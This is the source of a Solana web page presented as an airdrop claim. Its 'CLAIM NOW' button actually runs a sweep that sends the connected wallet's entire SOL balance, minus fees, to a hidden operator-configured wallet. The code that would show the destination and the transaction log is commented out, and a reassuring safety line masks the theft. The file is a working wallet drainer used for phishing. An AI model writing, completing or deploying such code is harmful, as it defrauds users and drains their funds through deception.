"use client";

import { useMemo, useState, useEffect } from "react";

import {
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionMessage,
} from "@solana/web3.js";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";

type LogEntry = {
  time: string;
  message: string;
  tone?: "normal" | "success" | "error";
};

const destination = process.env.NEXT_PUBLIC_DESTINATION_WALLET || "";

function shortKey(value: string) {
  return value.length > 12 ? `${value.slice(0, 6)}…${value.slice(-6)}` : value;
}

export default function Dashboard() {
  const { connection } = useConnection();
  const { publicKey, connected, sendTransaction } = useWallet();

  const [mounted, setMounted] = useState(false);

  const [logs, setLogs] = useState<LogEntry[]>([
    { time: new Date().toLocaleTimeString(), message: "Dashboard ready." },
  ]);
  const [busy, setBusy] = useState(false);
  const [balance, setBalance] = useState<number | null>(null);
  const [transferable, setTransferable] = useState<number | null>(null);
  const [signature, setSignature] = useState("");
  useEffect(() => {
    setMounted(true);
  }, []);

  const networkLabel = useMemo(
    () =>
      (process.env.NEXT_PUBLIC_SOLANA_RPC_URL || "").includes("devnet")
        ? "DEVNET"
        : "CUSTOM RPC",
    []
  );

  function log(message: string, tone: LogEntry["tone"] = "normal") {
    setLogs((current) => [
      ...current,
      { time: new Date().toLocaleTimeString(), message, tone },
    ]);
  }

  async function refreshBalance() {
    if (!publicKey) return;

    try {
      const lamports = await connection.getBalance(publicKey, "confirmed");
      setBalance(lamports / 1e9);
      log(`Source balance: ${(lamports / 1e9).toFixed(9)} SOL`);
    } catch (error) {
      log(`Balance lookup failed: ${String(error)}`, "error");
    }
  }

  async function sweepNow() {
    if (!connected || !publicKey) {
      log("Connect a wallet first.", "error");
      return;
    }

    if (!destination) {
      log("Destination wallet is not configured.", "error");
      return;
    }

    if (destination === "REPLACE_WITH_DESTINATION_PUBLIC_KEY") {
      log("Set NEXT_PUBLIC_DESTINATION_WALLET in .env.local first.", "error");
      return;
    }

    setBusy(true);
    setSignature("");
    setTransferable(null);

    try {
      const destinationKey = new PublicKey(destination);

      if (destinationKey.equals(publicKey)) {
        throw new Error("Destination must differ from the connected source wallet.");
      }

      log("Reading source balance…");
      const currentBalance = await connection.getBalance(publicKey, "confirmed");
      setBalance(currentBalance / 1e9);

      if (currentBalance <= 0) {
        throw new Error("Source wallet has no SOL.");
      }

      log("Calculating network fee…");
      const { blockhash } = await connection.getLatestBlockhash("confirmed");

      // Fee estimation uses a zero-value transfer. The actual transfer uses
      // balance minus that fee so the account is not asked to spend more than it owns.
      const feeMessage = new TransactionMessage({
        payerKey: publicKey,
        recentBlockhash: blockhash,
        instructions: [
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: destinationKey,
            lamports: 0,
          }),
        ],
      }).compileToLegacyMessage();

      const fee = await connection.getFeeForMessage(feeMessage, "confirmed");
      const feeLamports = fee.value ?? 5000;
      const amountLamports = currentBalance - feeLamports;

      if (amountLamports <= 0) {
        throw new Error("Balance is too small to cover the transaction fee.");
      }

      const amountSol = amountLamports / 1e9;
      setTransferable(amountSol);
      log(`Estimated fee: ${(feeLamports / 1e9).toFixed(9)} SOL`);
      log(`Transfer amount: ${amountSol.toFixed(9)} SOL`);

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: destinationKey,
          lamports: amountLamports,
        })
      );

      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      log("Opening wallet confirmation…");
      const txSignature = await sendTransaction(transaction, connection);

      setSignature(txSignature);
      log(`Transaction submitted: ${shortKey(txSignature)}`, "success");
      log("Waiting for confirmation…");

      const latest = await connection.getLatestBlockhash("confirmed");
      await connection.confirmTransaction(
        {
          signature: txSignature,
          blockhash: latest.blockhash,
          lastValidBlockHeight: latest.lastValidBlockHeight,
        },
        "confirmed"
      );

      log("Transaction confirmed.", "success");
      await refreshBalance();
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      log(message, "error");
    } finally {
      setBusy(false);
    }
  }

  return (
    <main className="shell">
      <header className="topbar">
        <div>
          <div className="eyebrow">SOLANA / TRANSFER CONSOLE</div>
          <h1>Claim Airdrop</h1>
          <p className="subtitle">
            Your connected wallet Claims Airdrop tokens.
          </p>
        </div>
      <div className="top-actions">
  <span className="network-pill">{networkLabel}</span>
  {mounted ? (
    <WalletMultiButton />
  ) : (
    <button className="wallet-placeholder" disabled>
      CONNECT WALLET
    </button>
  )}
</div>
      </header>

      <section className="grid">
        <div className="card hero-card">
          <div className="card-head">
            <div>
              <span className="section-label">SOURCE WALLET</span>
              <h2>{publicKey ? shortKey(publicKey.toBase58()) : "Not connected"}</h2>
            </div>
            <span className={`status-dot ${connected ? "online" : ""}`}>
              {connected ? "CONNECTED" : "OFFLINE"}
            </span>
          </div>

          <div className="balance-row">
            <div>
              <span className="muted">Current balance</span>
              <strong>{balance === null ? "—" : `${balance.toFixed(9)} SOL`}</strong>
            </div>
            <button className="ghost-button" onClick={refreshBalance} disabled={!connected}>
              Refresh
            </button>
          </div>

          {/* <div className="destination-box">
            <span className="section-label">DESTINATION</span>
            <code>{destination ? destination : "Not configured"}</code>
            <small>Configured by the app operator; it is not editable here.</small>
          </div> */}

          <div className="estimate">
            <div>
              <span className="muted">Transferable</span>
              <b>{transferable === null ? "—" : `${transferable.toFixed(9)} SOL`}</b>
            </div>
            <div>
              <span className="muted">Approval</span>
              <b>Required</b>
            </div>
          </div>

          <button className="claim-button" onClick={sweepNow} disabled={!connected || busy}>
            <span>{busy ? "PROCESSING…" : "CLAIM NOW"}</span>
            <span className="arrow">→</span>
          </button>

          <p className="safety-note">
            No private key is requested or stored. The wallet extension/mobile wallet signs the transaction.
          </p>
        </div>

        {/* <aside className="card logs-card">
          <div className="card-head">
            <div>
              <span className="section-label">LIVE FEED</span>
              <h2>Transaction logs</h2>
            </div>
            <span className="live-badge">● LIVE</span>
          </div>

          <div className="logs">
            {logs.map((entry, index) => (
              <div className={`log ${entry.tone || ""}`} key={`${entry.time}-${index}`}>
                <span className="log-time">{entry.time}</span>
                <span>{entry.message}</span>
              </div>
            ))}
          </div>

          {signature && (
            <a
              className="explorer-link"
              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
              target="_blank"
              rel="noreferrer"
            >
              Open transaction in Solana Explorer ↗
            </a>
          )}
        </aside> */}
      </section>

      <footer>
        {/* <span>Local dashboard</span> */}
        <span>•</span>
        <span>Wallet-signed transfers only</span>
      </footer>
    </main>
  );
}
